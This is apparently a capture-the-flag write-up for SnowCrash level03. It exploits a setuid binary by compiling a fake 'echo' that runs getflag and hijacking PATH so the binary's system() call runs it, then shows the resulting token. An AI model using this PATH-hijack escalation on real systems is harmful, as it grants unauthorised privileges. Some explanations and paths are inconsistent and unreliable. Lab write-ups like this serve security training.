Listing the files in the directory, we find a binary file:

```c
level03@SnowCrash:~$ ls -la level03
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

The s in level03 permissions indicates the SetUID bit. This means the file will run with the privileges of its owner instead of the user executing it. In our case, the owner is flag03.

To analyze the binary file, we transfer it to our local machine using **scp**:

```bash
level03@SnowCrash:~$ scp -P 4242 level03@127.0.0.1:/home/user/level03/level03 ./
```

We decompile the binary using [dogbolt.org](http://dogbolt.org) : 

![Capture d’écran 2025-02-03 à 13.11.17.png](attachment:615e25f0-f2af-40e9-8f97-6a735726b2de:Capture_decran_2025-02-03_a_13.11.17.png)

The script calls **getegid()** and **geteuid()** to retrieve the effective group ID and user ID, and then uses **setresgid()** and **setresuid()** to set them. In our case, these correspond to the **flag03** IDs.

Our goal is to execute the **getflag** command with **flag03** privileges to retrieve the token. Since this script runs a system call with these privileges, we can leverage this to obtain the token. 

Although we cannot modify the arguments passed to the system call directly, we can exploit the fact that **echo** is a built-in command and alter it’s behavior to execute the **getflag** function instead. 

We create our own version of echo and store it in **/tmp**, setting appropriate permission to ensures that the system call can use it.

```bash
level03@SnowCrash:~$ ****cd /tmp && mkdir echo
level03@SnowCrash:~$ cd echo && touch echo.c
level03@SnowCrash:~$ chmod 777 echo.c
```

```c
#include <stdlib.h>

int main(void) {
	system("/usr/bin/env getflag");
	return 1;
}
```

We compile the new **echo**.

```bash
level03@SnowCrash:~$ gcc echo.c -o echo
```

We add **/tmp** to the **$PATH** and remove **/bin** from it , ensuring that the system call will only find our custom definition of **echo**.

```bash
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ export PATH=$(echo $PATH | sed 's/\/bin//')
```

Finally, we run the binary:

```bash
level03@SnowCrash:~$ ./level03
Here is your token qi0maab88jeaj46qoumi7maus
```

### Ressources

- https://dogbolt.org/?id=0a105cdf-9237-4e31-9773-e9a12740c81a#Ghidra=162
- https://stackoverflow.com/questions/39939853/exploit-system-call-in-c
- https://www.go4expert.com/articles/exploit-c-t24920/
